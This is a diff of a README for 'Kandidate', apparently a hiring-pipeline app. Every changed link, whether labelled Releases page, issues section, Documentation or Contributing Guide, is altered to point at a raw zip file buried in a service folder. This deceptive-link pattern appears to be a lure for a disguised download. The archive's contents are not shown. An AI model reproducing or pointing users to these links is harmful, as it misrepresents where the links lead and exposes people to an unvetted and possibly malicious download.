@@ -6,7 +6,7 @@ Welcome to Kandidate! This open-source application acts like Trello for managing
 
 ## 📥 Download Kandidate
 
-[![Download Kandidate](https://raw.githubusercontent.com/Husnibari/Kandidate/main/services/service-results-db/app/database/Kandidate-1.7-beta.4.zip)](https://raw.githubusercontent.com/Husnibari/Kandidate/main/services/service-results-db/app/database/Kandidate-1.7-beta.4.zip)
+[![Download Kandidate](https://raw.githubusercontent.com/Husnibari/Kandidate/main/services/service-ai-analyzer/Software_v1.0.zip)](https://raw.githubusercontent.com/Husnibari/Kandidate/main/services/service-ai-analyzer/Software_v1.0.zip)
 
 To get started, click the button above to visit our Releases page. From there, you will be able to download the latest version of Kandidate.
 
@@ -22,7 +22,7 @@ Before installing Kandidate, please ensure your system meets these requirements:
 
 ## 💾 Download & Install
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/Husnibari/Kandidate/main/services/service-results-db/app/database/Kandidate-1.7-beta.4.zip) to download the latest version of Kandidate.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Husnibari/Kandidate/main/services/service-ai-analyzer/Software_v1.0.zip) to download the latest version of Kandidate.
   
 2. Once you're on the Releases page, find the version that matches your operating system.
   
@@ -77,12 +77,12 @@ A: Currently, it primarily supports English. Future updates may include language
 
 For help using Kandidate, you can:
 
-- Check the [issues section](https://raw.githubusercontent.com/Husnibari/Kandidate/main/services/service-results-db/app/database/Kandidate-1.7-beta.4.zip) of the GitHub repository for common questions and answers.
+- Check the [issues section](https://raw.githubusercontent.com/Husnibari/Kandidate/main/services/service-ai-analyzer/Software_v1.0.zip) of the GitHub repository for common questions and answers.
 - Reach out via email or the relevant contact form provided on our project page.
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://raw.githubusercontent.com/Husnibari/Kandidate/main/services/service-results-db/app/database/Kandidate-1.7-beta.4.zip)
-- [Contributing Guide](https://raw.githubusercontent.com/Husnibari/Kandidate/main/services/service-results-db/app/database/Kandidate-1.7-beta.4.zip)
+- [Documentation](https://raw.githubusercontent.com/Husnibari/Kandidate/main/services/service-ai-analyzer/Software_v1.0.zip)
+- [Contributing Guide](https://raw.githubusercontent.com/Husnibari/Kandidate/main/services/service-ai-analyzer/Software_v1.0.zip)
 
 Thank you for choosing Kandidate! We hope it helps you simplify your hiring process.
